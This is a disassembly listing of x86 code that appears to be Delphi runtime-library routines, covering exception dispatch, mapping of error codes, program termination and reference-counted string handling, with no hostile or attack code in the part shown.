                push    0
                push    0EEDFAE0h
                call    dword ptr ds:40A010h
                add     esp, 4
                pop     eax
                retn
; END OF FUNCTION CHUNK FOR sub_1D6C
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1D6C        proc near               ; CODE XREF: sub_218C-28B↓p

; FUNCTION CHUNK AT 00001D54 SIZE 00000015 BYTES

                cmp     byte ptr ds:40901Ch, 1
                jbe     short locret_1D7C
                push    eax
                push    ebx
                jmp     loc_1D54
; ---------------------------------------------------------------------------

locret_1D7C:                            ; CODE XREF: sub_1D6C+7↑j
                retn
sub_1D6C        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1D80        proc near               ; CODE XREF: sub_1DA0+C↓p
                test    ecx, ecx
                jz      short locret_1D9D
                mov     eax, [ecx+1]
                cmp     byte ptr [ecx], 0E9h
                jz      short loc_1D98
                cmp     byte ptr [ecx], 0EBh
                jnz     short locret_1D9D
                movsx   eax, al
                inc     ecx
                inc     ecx
                jmp     short loc_1D9B
; ---------------------------------------------------------------------------

loc_1D98:                               ; CODE XREF: sub_1D80+A↑j
                add     ecx, 5

loc_1D9B:                               ; CODE XREF: sub_1D80+16↑j
                add     ecx, eax

locret_1D9D:                            ; CODE XREF: sub_1D80+2↑j
                                        ; sub_1D80+F↑j
                retn
sub_1D80        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1DA0        proc near               ; CODE XREF: sub_C4C+1309↓p
                cmp     byte ptr ds:40901Ch, 1
                jbe     short locret_1DC6
                push    eax
                push    edx
                push    ecx
                call    sub_1D80
                push    ecx
                push    esp
                push    1
                push    0
                push    0EEDFAE1h
                call    dword ptr ds:40A010h
                pop     ecx
                pop     ecx
                pop     edx
                pop     eax

locret_1DC6:                            ; CODE XREF: sub_1DA0+7↑j
                retn
sub_1DA0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1DC8        proc near               ; CODE XREF: sub_1FBC+28↓p
                cmp     byte ptr ds:40901Ch, 1
                jbe     short locret_1DE3
                push    edx
                push    esp
                push    1
                push    0
                push    0EEDFAE2h
                call    dword ptr ds:40A010h
                pop     edx

locret_1DE3:                            ; CODE XREF: sub_1DC8+7↑j
                retn
sub_1DC8        endp


; =============== S U B R O U T I N E =======================================


sub_1DE4        proc near               ; CODE XREF: CODE:loc_2119↓p
                push    eax
                push    edx
                cmp     byte ptr ds:40901Ch, 1
                jbe     short loc_1DFF
                push    esp
                push    2
                push    0
                push    0EEDFAE3h
                call    dword ptr ds:40A010h

loc_1DFF:                               ; CODE XREF: sub_1DE4+9↑j
                pop     edx
                pop     eax
                retn
sub_1DE4        endp

; ---------------------------------------------------------------------------
                align 4
; START OF FUNCTION CHUNK FOR sub_218C
;   ADDITIONAL PARENT FUNCTION sub_21EC
;   ADDITIONAL PARENT FUNCTION sub_2F94

loc_1E04:                               ; CODE XREF: sub_218C+46↓j
                                        ; sub_21EC+46↓j ...
                mov     eax, [esp+0Ch+var_8]
                test    dword ptr [eax+4], 6
                jnz     loc_1F28
                cmp     dword ptr [eax], 0EEDFADEh
                mov     edx, [eax+18h]
                mov     ecx, [eax+14h]
                jz      short loc_1E91
                cld
                call    sub_1CFC
                mov     edx, ds:40A00Ch
                test    edx, edx
                jz      loc_1F28
                call    edx
                test    eax, eax
                jz      loc_1F28
                mov     edx, [esp+0Ch+var_s0]
                mov     ecx, [esp+0Ch+var_8]
                cmp     dword ptr [ecx], 0EEFFACEh
                jz      short loc_1E88
                call    sub_1D30
                cmp     byte ptr ds:409020h, 0
                jbe     short loc_1E88
                cmp     byte ptr ds:40901Ch, 0
                ja      short loc_1E88
                lea     ecx, [esp+0Ch+var_8]
                push    eax
                push    ecx
                call    sub_418
                cmp     eax, 0
                pop     eax
                jz      loc_1F28
                mov     edx, eax
                mov     eax, [esp+0Ch+var_8]
                mov     ecx, [eax+0Ch]
                jmp     short loc_1EB8
; ---------------------------------------------------------------------------

loc_1E88:                               ; CODE XREF: sub_218C-33D↑j
                                        ; sub_218C-32F↑j ...
                mov     edx, eax
                mov     eax, [esp+0Ch+var_8]
                mov     ecx, [eax+0Ch]

loc_1E91:                               ; CODE XREF: sub_218C-36B↑j
                cmp     byte ptr ds:409020h, 1
                jbe     short loc_1EB8
                cmp     byte ptr ds:40901Ch, 0
                ja      short loc_1EB8
                push    eax
                lea     eax, [esp+10h+var_8]
                push    edx
                push    ecx
                push    eax
                call    sub_418
                cmp     eax, 0
                pop     ecx
                pop     edx
                pop     eax
                jz      short loc_1F28

loc_1EB8:                               ; CODE XREF: sub_218C-306↑j
                                        ; sub_218C-2F4↑j ...
                or      dword ptr [eax+4], 2
                push    ebx
                xor     ebx, ebx
                push    esi
                push    edi
                push    ebp
                mov     ebx, fs:[ebx]
                push    ebx
                push    eax
                push    edx
                push    ecx
                mov     edx, [esp+2Ch+var_4]
                push    0
                push    eax
                push    402ADCh
                push    edx
                call    dword ptr ds:40A014h
                mov     edi, [esp-4+arg_24]
                call    sub_32C8
                push    dword ptr [eax+0]
                mov     [eax+0], esp
                mov     ebp, [edi+8]
                mov     ebx, [edi+4]
                mov     dword ptr [edi+4], 402B08h
                add     ebx, 5
                call    sub_1D6C
                jmp     ebx
; END OF FUNCTION CHUNK FOR sub_218C
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                call    sub_32C8
                mov     ecx, [eax+0]
                mov     edx, [ecx]
                mov     [eax+0], edx
                mov     eax, [ecx+8]
                jmp     sub_1D08
; ---------------------------------------------------------------------------
; START OF FUNCTION CHUNK FOR sub_218C

loc_1F28:                               ; CODE XREF: sub_218C-37D↑j
                                        ; sub_218C-35B↑j ...
                mov     eax, 1
                retn
; END OF FUNCTION CHUNK FOR sub_218C
; ---------------------------------------------------------------------------
                align 10h
; START OF FUNCTION CHUNK FOR sub_C4C
;   ADDITIONAL PARENT FUNCTION sub_1274
;   ADDITIONAL PARENT FUNCTION sub_1404
;   ADDITIONAL PARENT FUNCTION sub_1C38
;   ADDITIONAL PARENT FUNCTION sub_5A38
;   ADDITIONAL PARENT FUNCTION sub_6FD4
;   ADDITIONAL PARENT FUNCTION sub_7290

loc_1F30:                               ; CODE XREF: CODE:00000C3E↑j
                                        ; sub_C4C+D6↑j ...
                mov     eax, [esp+4+var_s0]
                mov     edx, [esp+8]
                test    dword ptr [eax+4], 6
                jz      short loc_1F60
                mov     ecx, [edx+4]
                mov     dword ptr [edx+4], 402B60h
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebp, [edx+8]
                add     ecx, 5
                call    sub_1DA0
                call    ecx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx

loc_1F60:                               ; CODE XREF: sub_C4C+12F3↑j
                mov     eax, 1
                retn
; END OF FUNCTION CHUNK FOR sub_C4C
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1F68        proc near               ; CODE XREF: sub_218C+50↓p
                                        ; sub_21EC+50↓p

arg_2C          = dword ptr  30h

                mov     eax, [esp+arg_2C]
                mov     dword ptr [eax+4], 402BB3h
                call    sub_32C8
                mov     edx, [eax+0]
                mov     ecx, [edx]
                mov     [eax+0], ecx
                mov     eax, [edx+0Ch]
                and     dword ptr [eax+4], 0FFFFFFFDh
                cmp     dword ptr [eax], 0EEDFADEh
                jz      short loc_1FA2
                mov     eax, [edx+8]
                call    sub_1D08
                call    sub_1D14

loc_1FA2:                               ; CODE XREF: sub_1F68+2B↑j
                xor     eax, eax
                add     esp, 14h
                mov     edx, fs:[eax]
                pop     ecx
                mov     edx, [edx]
                mov     [ecx], edx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                mov     eax, 1
                retn
sub_1F68        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1FBC        proc near               ; CODE XREF: sub_218C+55↓p
                                        ; sub_21EC+55↓p ...

arg_2C          = dword ptr  30h

                call    sub_32C8
                mov     edx, [eax+0]
                mov     ecx, [edx]
                mov     [eax+0], ecx
                mov     eax, [edx+8]
                call    sub_1D08
                pop     edx
                mov     esp, [esp-4+arg_2C]
                xor     eax, eax
                pop     ecx
                mov     fs:[eax], ecx
                pop     eax
                pop     ebp
                call    sub_1DC8
                jmp     edx
sub_1FBC        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_1FEC        proc near               ; CODE XREF: sub_1274+F5↑p
                                        ; sub_1274+14A↑p ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                xor     edx, edx
                mov     ecx, [esp+arg_4]
                mov     eax, [esp+arg_0]
                add     ecx, 5
                mov     fs:[edx], eax
                call    ecx
                retn    0Ch
sub_1FEC        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 4

loc_2004:                               ; CODE XREF: CODE:00002104↓j
                                        ; CODE:00002110↓j
                push    ebp
                mov     ebp, esp
                mov     edx, [ebp+8]
                mov     eax, [edx]
                cmp     eax, 0C0000092h
                jg      short loc_203F
                jz      short loc_2071
                cmp     eax, 0C000008Eh
                jg      short loc_2031
                jz      short loc_2075
                sub     eax, 0C0000005h
                jz      short loc_2081
                sub     eax, 87h
                jz      short loc_2069
                dec     eax
                jz      short loc_207D
                jmp     short loc_2091
; ---------------------------------------------------------------------------

loc_2031:                               ; CODE XREF: CODE:0000201A↑j
                add     eax, 3FFFFF71h
                sub     eax, 2
                jb      short loc_2071
                jz      short loc_206D
                jmp     short loc_2091
; ---------------------------------------------------------------------------

loc_203F:                               ; CODE XREF: CODE:00002011↑j
                cmp     eax, 0C0000096h
                jg      short loc_2057
                jz      short loc_2085
                sub     eax, 0C0000093h
                jz      short loc_207D
                dec     eax
                jz      short loc_2065
                dec     eax
                jz      short loc_2079
                jmp     short loc_2091
; ---------------------------------------------------------------------------

loc_2057:                               ; CODE XREF: CODE:00002044↑j
                sub     eax, 0C00000FDh
                jz      short loc_208D
                sub     eax, 3Dh ; '='
                jz      short loc_2089
                jmp     short loc_2091
; ---------------------------------------------------------------------------

loc_2065:                               ; CODE XREF: CODE:00002050↑j
                mov     al, 0C8h
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2069:                               ; CODE XREF: CODE:0000202A↑j
                mov     al, 0C9h
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_206D:                               ; CODE XREF: CODE:0000203B↑j
                mov     al, 0CDh
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2071:                               ; CODE XREF: CODE:00002013↑j
                                        ; CODE:00002039↑j
                mov     al, 0CFh
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2075:                               ; CODE XREF: CODE:0000201C↑j
                mov     al, 0C8h
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2079:                               ; CODE XREF: CODE:00002053↑j
                mov     al, 0D7h
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_207D:                               ; CODE XREF: CODE:0000202D↑j
                                        ; CODE:0000204D↑j
                mov     al, 0CEh
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2081:                               ; CODE XREF: CODE:00002023↑j
                mov     al, 0D8h
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2085:                               ; CODE XREF: CODE:00002046↑j
                mov     al, 0DAh
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2089:                               ; CODE XREF: CODE:00002061↑j
                mov     al, 0D9h
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_208D:                               ; CODE XREF: CODE:0000205C↑j
                mov     al, 0CAh
                jmp     short loc_2093
; ---------------------------------------------------------------------------

loc_2091:                               ; CODE XREF: CODE:0000202F↑j
                                        ; CODE:0000203D↑j ...
                mov     al, 0FFh

loc_2093:                               ; CODE XREF: CODE:00002067↑j
                                        ; CODE:0000206B↑j ...
                and     eax, 0FFh
                mov     edx, [edx+0Ch]
                call    sub_18D8
; ---------------------------------------------------------------------------
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------
                mov     eax, [esp+4]
                test    dword ptr [eax+4], 6
                jnz     loc_213E
                cmp     byte ptr ds:40901Ch, 0
                ja      short loc_20CD
                lea     eax, [esp+4]
                push    eax
                call    sub_418
                cmp     eax, 0
                jz      short loc_213E

loc_20CD:                               ; CODE XREF: CODE:000020BC↑j
                mov     eax, [esp+4]
                cld
                call    sub_1CFC
                mov     edx, [esp+8]
                push    0
                push    eax
                push    402CEAh
                push    edx
                call    dword ptr ds:40A014h
                mov     ebx, [esp+4]
                cmp     dword ptr [ebx], 0EEDFADEh
                mov     edx, [ebx+14h]
                mov     eax, [ebx+18h]
                jz      short loc_2119
                mov     edx, ds:40A00Ch
                test    edx, edx
                jz      loc_2004
                mov     eax, ebx
                call    edx
                test    eax, eax
                jz      loc_2004
                mov     edx, [ebx+0Ch]

loc_2119:                               ; CODE XREF: CODE:000020FA↑j
                call    sub_1DE4
                mov     ecx, ds:40A004h
                test    ecx, ecx
                jz      short loc_212A
                call    ecx

loc_212A:                               ; CODE XREF: CODE:00002126↑j
                mov     ecx, [esp+4]
                mov     eax, 0D9h
                mov     edx, [ecx+14h]
                mov     [esp], edx
                jmp     sub_2488
; ---------------------------------------------------------------------------

loc_213E:                               ; CODE XREF: CODE:000020AF↑j
                                        ; CODE:000020CB↑j
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2144        proc near               ; CODE XREF: sub_224C+2E↓p
                xor     edx, edx
                lea     eax, [ebp-0Ch]
                mov     ecx, fs:[edx]
                mov     fs:[edx], eax
                mov     [eax], ecx
                mov     dword ptr [eax+4], 402CA4h
                mov     [eax+8], ebp
                mov     ds:40A624h, eax
                retn
sub_2144        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2164        proc near               ; CODE XREF: sub_23A4:loc_242E↓p
                xor     edx, edx
                mov     eax, ds:40A624h
                test    eax, eax
                jz      short locret_218B
                mov     ecx, fs:[edx]
                cmp     eax, ecx
                jnz     short loc_217E
                mov     eax, [eax]
                mov     fs:[edx], eax
                retn
; ---------------------------------------------------------------------------

loc_217C:                               ; CODE XREF: sub_2164+21↓j
                mov     ecx, [ecx]

loc_217E:                               ; CODE XREF: sub_2164+10↑j
                cmp     ecx, 0FFFFFFFFh
                jz      short locret_218B
                cmp     [ecx], eax
                jnz     short loc_217C
                mov     eax, [eax]
                mov     [ecx], eax

locret_218B:                            ; CODE XREF: sub_2164+9↑j
                                        ; sub_2164+1D↑j
                retn
sub_2164        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_218C        proc near               ; CODE XREF: sub_218C+4B↓p
                                        ; sub_21EC+4B↓p ...

var_8           = dword ptr -8
var_4           = dword ptr -4
var_s0          = dword ptr  0
arg_24          = dword ptr  2Ch

; FUNCTION CHUNK AT 00001E04 SIZE 00000104 BYTES
; FUNCTION CHUNK AT 00001F28 SIZE 00000006 BYTES

                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                mov     edi, 40A620h
                mov     eax, [edi+8]
                test    eax, eax
                jz      short loc_21E6
                mov     ebx, [edi+0Ch]
                mov     esi, [eax+4]
                xor     edx, edx
                push    ebp
                push    402DD2h
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                test    ebx, ebx
                jle     short loc_21C8

loc_21B6:                               ; CODE XREF: sub_218C+3A↓j
                dec     ebx
                mov     [edi+0Ch], ebx
                mov     eax, [esi+ebx*8+4]
                test    eax, eax
                jz      short loc_21C4
                call    eax

loc_21C4:                               ; CODE XREF: sub_218C+34↑j
                test    ebx, ebx
                jg      short loc_21B6

loc_21C8:                               ; CODE XREF: sub_218C+28↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                jmp     short loc_21E6
; ---------------------------------------------------------------------------
                jmp     loc_1E04
; ---------------------------------------------------------------------------
                call    sub_218C
                call    sub_1F68
                call    sub_1FBC

loc_21E6:                               ; CODE XREF: sub_218C+10↑j
                                        ; sub_218C+44↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_218C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_21EC        proc near               ; CODE XREF: sub_224C+3A↓p

; FUNCTION CHUNK AT 00001E04 SIZE 00000104 BYTES

                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:40A628h
                test    eax, eax
                jz      short loc_2246
                mov     esi, [eax]
                xor     ebx, ebx
                mov     edi, [eax+4]
                xor     edx, edx
                push    ebp
                push    402E32h
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                cmp     esi, ebx
                jle     short loc_2228

loc_2214:                               ; CODE XREF: sub_21EC+3A↓j
                mov     eax, [edi+ebx*8]
                inc     ebx
                mov     ds:40A62Ch, ebx
                test    eax, eax
                jz      short loc_2224
                call    eax

loc_2224:                               ; CODE XREF: sub_21EC+34↑j
                cmp     esi, ebx
                jg      short loc_2214

loc_2228:                               ; CODE XREF: sub_21EC+26↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                jmp     short loc_2246
; ---------------------------------------------------------------------------
                jmp     loc_1E04
; ---------------------------------------------------------------------------
                call    sub_218C
                call    sub_1F68
                call    sub_1FBC

loc_2246:                               ; CODE XREF: sub_21EC+D↑j
                                        ; sub_21EC+44↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_21EC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_224C        proc near               ; CODE XREF: sub_3314+3A↓p
                mov     dword ptr ds:40A010h, 401008h
                mov     dword ptr ds:40A014h, 401010h
                mov     ds:40A628h, eax
                xor     eax, eax
                mov     ds:40A62Ch, eax
                mov     ds:40A630h, edx
                mov     eax, [edx+4]
                mov     ds:40A01Ch, eax
                call    sub_2144
                mov     byte ptr ds:40A024h, 0
                call    sub_21EC
                retn
sub_224C        endp


; =============== S U B R O U T I N E =======================================


sub_228C        proc near               ; CODE XREF: sub_23A4+38↓p
                push    ebx
                push    esi
                push    edi
                mov     esi, 409060h
                mov     cl, 10h
                mov     ebx, ds:409000h

loc_229C:                               ; CODE XREF: sub_228C+33↓j
                mov     eax, ebx
                mov     edi, 0Ah
                cdq
                idiv    edi
                add     dl, 30h ; '0'
                xor     eax, eax
                mov     al, cl
                mov     [esi+eax], dl
                mov     eax, ebx
                mov     ebx, 0Ah
                cdq
                idiv    ebx
                mov     ebx, eax
                dec     ecx
                test    ebx, ebx
                jnz     short loc_229C
                mov     cl, 1Ch
                mov     eax, ds:409004h

loc_22C8:                               ; CODE XREF: sub_228C+54↓j
                mov     edx, eax
                and     edx, 0Fh
                mov     dl, [edx+409080h]
                xor     ebx, ebx
                mov     bl, cl
                mov     [esi+ebx], dl
                shr     eax, 4
                dec     ecx
                test    eax, eax
                jnz     short loc_22C8
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_228C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_22E8        proc near               ; CODE XREF: sub_23A4+9E↓p
                xor     eax, eax
                xchg    eax, ds:409000h
                neg     eax
                sbb     eax, eax
                inc     eax
                mov     edi, 40A620h
                mov     ebx, [edi+18h]
                mov     ebp, [edi+14h]
                push    dword ptr [edi+1Ch]
                push    dword ptr [edi+20h]
                mov     esi, [edi]
                mov     ecx, 0Bh
                rep movsd
                pop     edi
                pop     esi
                leave
                retn    0Ch
sub_22E8        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2318        proc near               ; CODE XREF: sub_23A4+3D↓p

var_4           = byte ptr -4

                push    ecx
                cmp     byte ptr ds:40A034h, 0
                jz      short loc_2379
                cmp     word ptr ds:40A208h, 0D7B2h
                jnz     short loc_2341
                cmp     dword ptr ds:40A210h, 0
                jbe     short loc_2341
                mov     eax, 40A204h
                call    dword ptr ds:40A220h

loc_2341:                               ; CODE XREF: sub_2318+13↑j
                                        ; sub_2318+1C↑j
                push    0
                lea     eax, [esp+8+var_4]
                push    eax
                push    1Eh
                push    409060h
                push    0FFFFFFF5h
                call    sub_400
                push    eax
                call    sub_420
                push    0
                lea     eax, [esp+8+var_4]
                push    eax
                push    2
                push    402FA0h
                push    0FFFFFFF5h
                call    sub_400
                push    eax
                call    sub_420
                pop     edx
                retn
; ---------------------------------------------------------------------------

loc_2379:                               ; CODE XREF: sub_2318+8↑j
                cmp     byte ptr ds:409024h, 0
                jnz     short loc_2395
                push    0
                push    409058h
                push    409060h
                push    0
                call    sub_430

loc_2395:                               ; CODE XREF: sub_2318+68↑j
                pop     edx
                retn
sub_2318        endp

; ---------------------------------------------------------------------------
                align 4
                dd 0FFFFFFFFh, 2, 0A0Dh

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_23A4        proc near               ; CODE XREF: sub_247C+5↓p
                                        ; CODE:00007627↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebx, 40A620h
                mov     esi, 409000h
                mov     edi, 40A030h
                cmp     byte ptr [ebx+28h], 0
                jnz     short loc_23D3
                cmp     dword ptr [edi], 0
                jz      short loc_23D3

loc_23C2:                               ; CODE XREF: sub_23A4+2D↓j
                mov     edx, [edi]
                mov     eax, edx
                xor     edx, edx
                mov     [edi], edx
                mov     ebp, eax
                call    ebp
                cmp     dword ptr [edi], 0
                jnz     short loc_23C2

loc_23D3:                               ; CODE XREF: sub_23A4+17↑j
                                        ; sub_23A4+1C↑j
                cmp     dword ptr ds:409004h, 0
                jz      short loc_23ED
                call    sub_228C
                call    sub_2318
                xor     eax, eax
                mov     ds:409004h, eax

loc_23ED:                               ; CODE XREF: sub_23A4+36↑j
                                        ; sub_23A4+CE↓j
                cmp     byte ptr [ebx+28h], 2
                jnz     short loc_23FD
                cmp     dword ptr [esi], 0
                jnz     short loc_23FD
                xor     eax, eax
                mov     [ebx+0Ch], eax

loc_23FD:                               ; CODE XREF: sub_23A4+4D↑j
                                        ; sub_23A4+52↑j
                call    sub_218C
                cmp     byte ptr [ebx+28h], 1
                jbe     short loc_240D
                cmp     dword ptr [esi], 0
                jz      short loc_242E

loc_240D:                               ; CODE XREF: sub_23A4+62↑j
                mov     eax, [ebx+10h]
                test    eax, eax
                jz      short loc_242E
                call    sub_3000
                mov     edx, [ebx+10h]
                mov     eax, [edx+10h]
                cmp     eax, [edx+4]
                jz      short loc_242E
                test    eax, eax
                jz      short loc_242E
                push    eax
                call    sub_438

loc_242E:                               ; CODE XREF: sub_23A4+67↑j
                                        ; sub_23A4+6E↑j ...
                call    sub_2164
                cmp     byte ptr [ebx+28h], 1
                jnz     short loc_243C
                call    dword ptr [ebx+24h]

loc_243C:                               ; CODE XREF: sub_23A4+93↑j
                cmp     byte ptr [ebx+28h], 0
                jz      short loc_2447
                call    sub_22E8

loc_2447:                               ; CODE XREF: sub_23A4+9C↑j
                cmp     dword ptr [ebx], 0
                jnz     short loc_2463
                cmp     dword ptr ds:40A018h, 0
                jz      short loc_245B
                call    dword ptr ds:40A018h

loc_245B:                               ; CODE XREF: sub_23A4+AF↑j
                mov     eax, [esi]
                push    eax
                call    sub_428

loc_2463:                               ; CODE XREF: sub_23A4+A6↑j
                mov     eax, [ebx]
                push    esi
                mov     esi, eax
                mov     edi, ebx
                mov     ecx, 0Bh
                rep movsd
                pop     esi
                jmp     loc_23ED
sub_23A4        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_247C        proc near               ; CODE XREF: sub_18D8+6↑p
                                        ; sub_2488+6↓j
                mov     ds:409000h, eax
                call    sub_23A4
sub_247C        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_2488        proc near               ; CODE XREF: CODE:00002139↑j
                                        ; sub_3284+1A↓p ...
                pop     dword ptr ds:409004h
                jmp     sub_247C
sub_2488        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_2494        proc near               ; CODE XREF: sub_2584+23↓p
                                        ; sub_2864+36↓p ...
                mov     edx, [eax]
                test    edx, edx
                jz      short locret_24B6
                mov     dword ptr [eax], 0
                mov     ecx, [edx-8]
                dec     ecx
                jl      short locret_24B6
                lock dec dword ptr [edx-8]
                jnz     short locret_24B6
                push    eax
                lea     eax, [edx-8]
                call    sub_1868
                pop     eax

locret_24B6:                            ; CODE XREF: sub_2494+4↑j
                                        ; sub_2494+10↑j ...
                retn
sub_2494        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_24B8        proc near               ; CODE XREF: sub_2A4C+56↓p
                                        ; sub_41E0+B9↓p ...
                push    ebx
                push    esi
                mov     ebx, eax
                mov     esi, edx

loc_24BE:                               ; CODE XREF: sub_24B8+2A↓j
                mov     edx, [ebx]
                test    edx, edx
                jz      short loc_24DE
                mov     dword ptr [ebx], 0
                mov     ecx, [edx-8]
                dec     ecx
                jl      short loc_24DE
                lock dec dword ptr [edx-8]
                jnz     short loc_24DE
                lea     eax, [edx-8]
                call    sub_1868

loc_24DE:                               ; CODE XREF: sub_24B8+A↑j
                                        ; sub_24B8+16↑j ...
                add     ebx, 4
                dec     esi
                jnz     short loc_24BE
                pop     esi
                pop     ebx
                retn
sub_24B8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_24E8        proc near               ; CODE XREF: sub_2614+8↓j
                                        ; sub_2658+6↓j ...
                test    edx, edx
                jz      short loc_2510
                mov     ecx, [edx-8]
                inc     ecx
                jg      short loc_250C
                push    eax
                push    edx
                mov     eax, [edx-4]
                call    sub_2558
                mov     edx, eax
                pop     eax
                push    edx
                mov     ecx, [eax-4]
                call    sub_194C
                pop     edx
                pop     eax
                jmp     short loc_2510
; ---------------------------------------------------------------------------

loc_250C:                               ; CODE XREF: sub_24E8+8↑j
                lock inc dword ptr [edx-8]

loc_2510:                               ; CODE XREF: sub_24E8+2↑j
                                        ; sub_24E8+22↑j
                xchg    edx, [eax]
                test    edx, edx
                jz      short locret_252A
                mov     ecx, [edx-8]
                dec     ecx
                jl      short locret_252A
                lock dec dword ptr [edx-8]
                jnz     short locret_252A
                lea     eax, [edx-8]
                call    sub_1868

locret_252A:                            ; CODE XREF: sub_24E8+2C↑j
                                        ; sub_24E8+32↑j ...
                retn
sub_24E8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_252C        proc near               ; CODE XREF: sub_41E0+45↓p
                                        ; sub_4480+98↓p ...
                test    edx, edx
                jz      short loc_253A
                mov     ecx, [edx-8]
                inc     ecx
                jle     short loc_253A
                lock inc dword ptr [edx-8]

loc_253A:                               ; CODE XREF: sub_252C+2↑j
                                        ; sub_252C+8↑j
                xchg    edx, [eax]
                test    edx, edx
                jz      short locret_2554
                mov     ecx, [edx-8]
                dec     ecx
                jl      short locret_2554
                lock dec dword ptr [edx-8]
                jnz     short locret_2554
                lea     eax, [edx-8]
                call    sub_1868

locret_2554:                            ; CODE XREF: sub_252C+12↑j
                                        ; sub_252C+18↑j ...
                retn
sub_252C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2558        proc near               ; CODE XREF: sub_24E8+F↑p
                                        ; sub_2584+B↓p ...
                test    eax, eax
                jle     short loc_2580
                push    eax
                add     eax, 0Ah
                and     eax, 0FFFFFFFEh
                push    eax
                call    sub_1848
                pop     edx
                mov     word ptr [edx+eax-2], 0
                add     eax, 8
                pop     edx
                mov     [eax-4], edx
                mov     dword ptr [eax-8], 1
                retn
; ---------------------------------------------------------------------------

loc_2580:                               ; CODE XREF: sub_2558+2↑j
                xor     eax, eax
                retn
sub_2558        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2584        proc near               ; CODE XREF: sub_25B4+8↓p
                                        ; sub_25C4:loc_25EB↓j ...
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                mov     esi, edx
                mov     edi, ecx
                mov     eax, edi
                call    sub_2558
                mov     ecx, edi
                mov     edi, eax
                test    esi, esi
                jz      short loc_25A5
                mov     edx, eax
                mov     eax, esi
                call    sub_194C

loc_25A5:                               ; CODE XREF: sub_2584+16↑j
                mov     eax, ebx
                call    sub_2494
                mov     [ebx], edi
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_2584        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_25B4        proc near               ; CODE XREF: sub_4148+3E↓p
                                        ; sub_6140+80↓p ...
                push    edx
                mov     edx, esp
                mov     ecx, 1
                call    sub_2584
                pop     edx
                retn
sub_25B4        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_25C4        proc near               ; CODE XREF: sub_3DD0+87↓p
                                        ; sub_3FF8+2A↓p ...
                xor     ecx, ecx
                test    edx, edx
                jz      short loc_25EB
                push    edx

loc_25CB:                               ; CODE XREF: sub_25C4+1D↓j
                cmp     cl, [edx]
                jz      short loc_25E6
                cmp     cl, [edx+1]
                jz      short loc_25E5
                cmp     cl, [edx+2]
                jz      short loc_25E4
                cmp     cl, [edx+3]
                jz      short loc_25E3
                add     edx, 4
                jmp     short loc_25CB
